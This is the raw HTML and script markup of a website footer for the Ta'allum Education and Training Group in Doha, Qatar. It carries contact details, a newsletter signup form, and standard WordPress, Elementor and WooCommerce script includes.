					<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-68b6ad6" data-id="68b6ad6" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-1fd27dd elementor-widget elementor-widget-ova_logo" data-id="1fd27dd" data-element_type="widget" data-widget_type="ova_logo.default">
				<div class="elementor-widget-container">
			
		<div class="brand_el">

											<a href="https://taalumgroup.com/ "   >
			
				<img src="http://taalumgroup.com/wp-content/uploads/2022/03/logo-1.png" 
					alt="Taallum Education and Training Group" 
					class="logo_desktop" 
					style="width:auto ; height:80px" 
				/>

				<img src="http://taalumgroup.com/wp-content/uploads/2024/12/taallum-logo.png" 
					alt="Taallum Education and Training Group" 
					class="logo_mobile" 
					style="width:auto ;  height:40px" 
				/>

				<img src="http://taalumgroup.com/wp-content/uploads/2022/03/logo-1.png" 
					alt="Taallum Education and Training Group" 
					class="logo_sticky" 
					style="width:auto ; height:80px" 
				/>

							</a>
			
		</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-5e53545 elementor-widget elementor-widget-text-editor" data-id="5e53545" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>The Ta’allum Group is a group of Premier Educational Institutions which stands for dedication to education.</p>						</div>
				</div>
				<div class="elementor-element elementor-element-8e5e759 elementor-shape-circle e-grid-align-left elementor-grid-0 elementor-widget elementor-widget-social-icons" data-id="8e5e759" data-element_type="widget" data-widget_type="social-icons.default">
				<div class="elementor-widget-container">
					<div class="elementor-social-icons-wrapper elementor-grid">
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-repeater-item-41c6ca0" href="https://twitter.com/TaallumGroup" target="_blank">
						<span class="elementor-screen-only">Twitter</span>
						<svg class="e-font-icon-svg e-fab-twitter" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-repeater-item-9f11722" href="https://www.facebook.com/Taallumgroup/" target="_blank">
						<span class="elementor-screen-only">Facebook</span>
						<svg class="e-font-icon-svg e-fab-facebook" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-repeater-item-25cbc0a" href="https://www.youtube.com/channel/UCdIGH-MF8k8y0SwW3PQYI0g" target="_blank">
						<span class="elementor-screen-only">Youtube</span>
						<svg class="e-font-icon-svg e-fab-youtube" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-ovaicon-instagram elementor-repeater-item-2a09ce2" href="https://www.instagram.com/taallumgroup" target="_blank">
						<span class="elementor-screen-only">Ovaicon-instagram</span>
						<i class="ovaicon ovaicon-instagram"></i>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin elementor-repeater-item-d4024f7" href="https://www.linkedin.com/company/ta-allum-training-education-group/" target="_blank">
						<span class="elementor-screen-only">Linkedin</span>
						<svg class="e-font-icon-svg e-fab-linkedin" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>					</a>
				</span>
					</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-ab04bef" data-id="ab04bef" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-118bbe6 elementor-widget elementor-widget-infetech_elementor_heading" data-id="118bbe6" data-element_type="widget" data-widget_type="infetech_elementor_heading.default">
				<div class="elementor-widget-container">
			
			<div class="ova-heading">
				
									<h2 class="sub-title">
						<span class="underlined"></span>
						Links					</h2>	
				
				
                
			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-71264d9 elementor-widget elementor-widget-infetech_elementor_menu_footer" data-id="71264d9" data-element_type="widget" data-widget_type="infetech_elementor_menu_footer.default">
				<div class="elementor-widget-container">
					<div class="ova-menu-footer">
			<ul id="menu-links" class="menu"><li id="menu-item-13768" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13768"><a target="_blank" href="/wp-content/uploads/2024/12/School-Calendar-2024-2025-1.pdf">School Calendar</a></li>
<li id="menu-item-13765" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13765"><a target="_blank" href="https://admission.apps.taallumgroup.com/">Online Admission</a></li>
<li id="menu-item-13770" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13770"><a target="_blank" href="https://taalumgroup.com/careers-2/">Careers</a></li>
<li id="menu-item-13771" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13771"><a target="_blank" href="/wp-content/uploads/2024/12/Taallum-Newsletter-Jan-2023.pdf">Newsletter</a></li>
<li id="menu-item-13767" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13767"><a target="_blank" href="http://hr.apps.taallumgroup.com/">ESS</a></li>
<li id="menu-item-14416" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14416"><a href="https://taalumgroup.com/privacy-policy/">Privacy Policy Mobile App</a></li>
</ul>		</div>

				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-0ea6d0d" data-id="0ea6d0d" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-b031999 elementor-widget elementor-widget-infetech_elementor_heading" data-id="b031999" data-element_type="widget" data-widget_type="infetech_elementor_heading.default">
				<div class="elementor-widget-container">
			
			<div class="ova-heading">
				
									<h2 class="sub-title">
						<span class="underlined"></span>
						Newsletter					</h2>	
				
				
                
			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-94b4045 elementor-widget elementor-widget-text-editor" data-id="94b4045" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Stay connected. Subscribe to our mailing list.</p>						</div>
				</div>
				<div class="elementor-element elementor-element-9dc3cd7 elementor-widget elementor-widget-shortcode" data-id="9dc3cd7" data-element_type="widget" data-widget_type="shortcode.default">
				<div class="elementor-widget-container">
					<div class="elementor-shortcode"><script>(function() {
	window.mc4wp = window.mc4wp || {
		listeners: [],
		forms: {
			on: function(evt, cb) {
				window.mc4wp.listeners.push(
					{
						event   : evt,
						callback: cb
					}
				);
			}
		}
	}
})();
</script><!-- Mailchimp for WordPress v4.9.19 - https://wordpress.org/plugins/mailchimp-for-wp/ --><form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-72" method="post" data-id="72" data-name="Newsletter" ><div class="mc4wp-form-fields"><div class="ova-subscribe-form-wrapper ">
   <div class="ova-subscribe-form">
       <input type="email" name="EMAIL" placeholder="Enter your email" required />
       <button type="submit" value="">
          <span class="text">SUBSCRIBE</span>
          <i class="flaticon flaticon-send"></i>
       </button>
   </div>
  
   <label>
      <input name="AGREE_TO_TERMS" type="radio" value="1" required="">
      <a href="#" target="_blank" rel="noopener">
        I agree to all terms and policies.
      </a>
   </label>
</div></div><label style="display: none !important;">Leave this field empty if you're human: <input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off" /></label><input type="hidden" name="_mc4wp_timestamp" value="1764309704" /><input type="hidden" name="_mc4wp_form_id" value="72" /><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1" /><div class="mc4wp-response"></div></form><!-- / Mailchimp for WordPress Plugin --></div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-1f9b0a2" data-id="1f9b0a2" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-2000bf4 elementor-widget elementor-widget-infetech_elementor_heading" data-id="2000bf4" data-element_type="widget" data-widget_type="infetech_elementor_heading.default">
				<div class="elementor-widget-container">
			
			<div class="ova-heading">
				
									<h2 class="sub-title">
						<span class="underlined"></span>
						Contact					</h2>	
				
				
                
			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-59fca8c elementor-widget__width-inherit elementor-widget elementor-widget-infetech_elementor_contact_info" data-id="59fca8c" data-element_type="widget" data-widget_type="infetech_elementor_contact_info.default">
				<div class="elementor-widget-container">
						<div class="ova-contact-info template1">
				
													    	<div class="icon">
							<i class="flaticon flaticon-telephone-call"></i>
						</div>
								    				
				<div class="contact">
					
					
					<ul class="info">
						
								<li class="item">

									<a href="tel:+9744915410" title="+974 4491-5410">+974 4491-5410</a>								</li>
							
						
								<li class="item">

									<a href="tel:+9744915410 tel:+97444915428" title="+ 974 4491-5428">+ 974 4491-5428</a>								</li>
							
											</ul>

				</div>

			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-efbe1d2 elementor-widget elementor-widget-infetech_elementor_contact_info" data-id="efbe1d2" data-element_type="widget" data-widget_type="infetech_elementor_contact_info.default">
				<div class="elementor-widget-container">
						<div class="ova-contact-info template1">
				
													    	<div class="icon">
							<i class="flaticon flaticon-email"></i>
						</div>
								    				
				<div class="contact">
					
					
					<ul class="info">
						
								<li class="item">

									<a href="mailto:info@taalumgroup.com" target="_blank" title="info@taalumgroup.com">info@taalumgroup.com</a>								</li>
							
											</ul>

				</div>

			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-55c0a7c elementor-widget elementor-widget-infetech_elementor_contact_info" data-id="55c0a7c" data-element_type="widget" data-widget_type="infetech_elementor_contact_info.default">
				<div class="elementor-widget-container">
						<div class="ova-contact-info template1">
				
													    	<div class="icon">
							<i class="fas fa-map-marker-alt"></i>
						</div>
								    				
				<div class="contact">
					
					
					<ul class="info">
						
								<li class="item">

									<a href="https://maps.app.goo.gl/3jhJ6ZRj2U5kzhms7" target="_blank" title="Ta&#039;allum Group PO.Box: 4219, Doha, Qatar">Ta&#039;allum Group PO.Box: 4219, Doha, Qatar</a>								</li>
							
											</ul>

				</div>

			</div>

				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-e093732 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="e093732" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-70fc561" data-id="70fc561" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-971e340 elementor-widget elementor-widget-text-editor" data-id="971e340" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Copyright © 2025 Ta&#8217;allum Group. All rights reserved.</p>						</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				</div>
					</div>
			
		</div> <!-- Ova Wrapper -->	
		
		<script>
			window.RS_MODULES = window.RS_MODULES || {};
			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
			window.RS_MODULES.defered = true;
			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
			window.RS_MODULES.type = 'compiled';
		</script>
		<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/infetech\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<script>(function() {function maybePrefixUrlField () {
  const value = this.value.trim()
  if (value !== '' && value.indexOf('http') !== 0) {
    this.value = 'http://' + value
  }
}

const urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]')
for (let j = 0; j < urlFields.length; j++) {
  urlFields[j].addEventListener('blur', maybePrefixUrlField)
}
})();</script>			<script type='text/javascript'>
				const lazyloadRunObserver = () => {
					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
						entries.forEach( ( entry ) => {
							if ( entry.isIntersecting ) {
								let lazyloadBackground = entry.target;
								if( lazyloadBackground ) {
									lazyloadBackground.classList.add( 'e-lazyloaded' );
								}
								lazyloadBackgroundObserver.unobserve( entry.target );
							}
						});
					}, { rootMargin: '200px 0px 200px 0px' } );
					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
						lazyloadBackgroundObserver.observe( lazyloadBackground );
					} );
				};
				const events = [
					'DOMContentLoaded',
					'elementor/lazyload/observe',
				];
				events.forEach( ( event ) => {
					document.addEventListener( event, lazyloadRunObserver );
				} );
			</script>
				<script type='text/javascript'>
		(function () {
			var c = document.body.className;
			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
			document.body.className = c;
		})();
	</script>
	<link rel='stylesheet' id='wc-blocks-style-css' href='https://taalumgroup.com/wp-content/plugins/woocommerce/assets/client/blocks/wc-blocks.css?ver=wc-9.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-13988-css' href='https://taalumgroup.com/wp-content/uploads/elementor/css/post-13988.css?ver=1764102527' type='text/css' media='all' />
<link rel='stylesheet' id='widget-text-editor-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-13042-css' href='https://taalumgroup.com/wp-content/uploads/elementor/css/post-13042.css?ver=1764101489' type='text/css' media='all' />
<link rel='stylesheet' id='widget-social-icons-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/css/widget-social-icons.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='e-apple-webkit-css' href='https://taalumgroup.com/wp-content/plugins/elementor/assets/css/conditionals/apple-webkit.min.css?ver=3.25.10' type='text/css' media='all' />
<link rel='stylesheet' id='rs-plugin-settings-css' href='https://taalumgroup.com/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.6.10' type='text/css' media='all' />
<style id='rs-plugin-settings-inline-css' type='text/css'>
#rs-demo-id {}
</style>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/ova-career/assets/js/script-elementor.js?ver=6.8.3" id="script-elementor-career-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/ova-project/assets/js/script-elementor.js?ver=6.8.3" id="script-elementor-project-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/ova-team/assets/js/script-elementor.js?ver=6.8.3" id="script-elementor-team-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.0.1" id="swv-js"></script>
<script type="text/javascript" id="contact-form-7-js-before">
/* <![CDATA[ */
var wpcf7 = {
    "api": {
        "root": "https:\/\/taalumgroup.com\/wp-json\/",
        "namespace": "contact-form-7\/v1"
    }
};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.0.1" id="contact-form-7-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/modal-maker/assets/js/my-modal-script.js?ver=1.3" id="my-modal-script-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/ova-career/assets/js/script.js?ver=6.8.3" id="script-career-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/revslider/public/assets/js/rbtools.min.js?ver=6.6.10" defer async id="tp-tools-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.6.10" defer async id="revmin-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/libs/carousel/owl.carousel.min.js" id="carousel-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/libs/appear/appear.js" id="appear-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/imagesloaded.min.js?ver=5.0.0" id="imagesloaded-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/masonry.min.js?ver=4.2.2" id="masonry-js"></script>
<script type="text/javascript" id="infetech-script-js-extra">
/* <![CDATA[ */
var ScrollUpText = {"value":"Go to top"};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/js/script.js" id="infetech-script-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/js/woo.js" id="infetech-woo-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/js/modal-viewer.js" id="modal-viewer-js"></script>
<script type="module" src="https://taalumgroup.com/wp-content/plugins/elementor-pro/assets//lib/instant-page/instant-page.min.js?ver=3.25.3" id="instant-page-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/page-links-to/dist/new-tab.js?ver=3.3.7" id="page-links-to-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/woocommerce/assets/js/sourcebuster/sourcebuster.min.js?ver=9.4.3" id="sourcebuster-js-js"></script>
<script type="text/javascript" id="wc-order-attribution-js-extra">
/* <![CDATA[ */
var wc_order_attribution = {"params":{"lifetime":1.0e-5,"session":30,"base64":false,"ajaxurl":"https:\/\/taalumgroup.com\/wp-admin\/admin-ajax.php","prefix":"wc_order_attribution_","allowTracking":true},"fields":{"source_type":"current.typ","referrer":"current_add.rf","utm_campaign":"current.cmp","utm_source":"current.src","utm_medium":"current.mdm","utm_content":"current.cnt","utm_id":"current.id","utm_term":"current.trm","utm_source_platform":"current.plt","utm_creative_format":"current.fmt","utm_marketing_tactic":"current.tct","session_entry":"current_add.ep","session_start_time":"current_add.fd","session_pages":"session.pgs","session_count":"udata.vst","user_agent":"udata.uag"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/woocommerce/assets/js/frontend/order-attribution.min.js?ver=9.4.3" id="wc-order-attribution-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/js/elementor/ova-search-popup.js?ver=6.8.3" id="infetech-elementor-ova-search-popup-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/themes/infetech/assets/js/elementor/menu-canvas.js?ver=6.8.3" id="infetech-elementor-menu-canvas-js"></script>
<script type="text/javascript" defer src="https://taalumgroup.com/wp-content/plugins/mailchimp-for-wp/assets/js/forms.js?ver=4.9.19" id="mc4wp-forms-api-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.25.3" id="elementor-pro-webpack-runtime-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.25.10" id="elementor-webpack-runtime-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.25.10" id="elementor-frontend-modules-js"></script>
<script type="text/javascript" id="elementor-pro-frontend-js-before">
/* <![CDATA[ */
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/taalumgroup.com\/wp-admin\/admin-ajax.php","nonce":"7ebff9571b","urls":{"assets":"https:\/\/taalumgroup.com\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/taalumgroup.com\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},
"woocommerce":{"menu_cart":{"cart_page_url":"https:\/\/taalumgroup.com\/?page_id=11","checkout_page_url":"https:\/\/taalumgroup.com\/?page_id=12","fragments_nonce":"d0c22ffefa"}},
"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/taalumgroup.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.25.3" id="elementor-pro-frontend-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
<script type="text/javascript" id="elementor-frontend-js-before">
/* <![CDATA[ */
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},
"hasCustomBreakpoints":false},"version":"3.25.10","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_optimized_control_loading":true,"e_onboarding":true,"e_css_smooth_scroll":true,"theme_builder_v2":true,"home_screen":true,"nested-elements":true,"editor_v2":true,"e_element_cache":true,"link-in-bio":true,"floating-buttons":true,"launchpad-checklist":true},"urls":{"assets":"https:\/\/taalumgroup.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/taalumgroup.com\/wp-admin\/admin-ajax.php","uploadUrl":"http:\/\/taalumgroup.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"f07a354ce3"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","woocommerce_notices_elements":[]},"post":{"id":13322,"title":"Al%20Jazeera%20Academy%20%E2%80%93%20Taallum%20Education%20and%20Training%20Group","excerpt":"","featuredImage":false}};
/* ]]> */
</script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.25.10" id="elementor-frontend-js"></script>
<script type="text/javascript" src="https://taalumgroup.com/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.25.3" id="pro-elements-handlers-js"></script>
		<script>
        document.addEventListener("DOMContentLoaded", function() {
            var modal = document.getElementById("pdfModal");
            var pdfViewer = document.getElementById("pdfViewer");
            var closeModal = document.querySelector(".modal .close");
        
            // Open modal when a PDF link is clicked
            document.querySelectorAll(".pdf-link").forEach(function(link) {
                link.addEventListener("click", function(e) {
                    e.preventDefault();
                    var pdfUrl = this.getAttribute("href");
                    pdfViewer.src = pdfUrl;
                    modal.style.display = "block";
                });
            });
        
            // Close modal
            closeModal.addEventListener("click", function() {
                modal.style.display = "none";
                pdfViewer.src = "";
            });
        
            // Close modal when clicking outside
            window.addEventListener("click", function(e) {
                if (e.target == modal) {
                    modal.style.display = "none";
                    pdfViewer.src = "";
                }
            });
        });
        </script>

	</body><!-- /body -->
<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl489531'},{'dcenter':'p3'},{'cp_id':'10105027'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
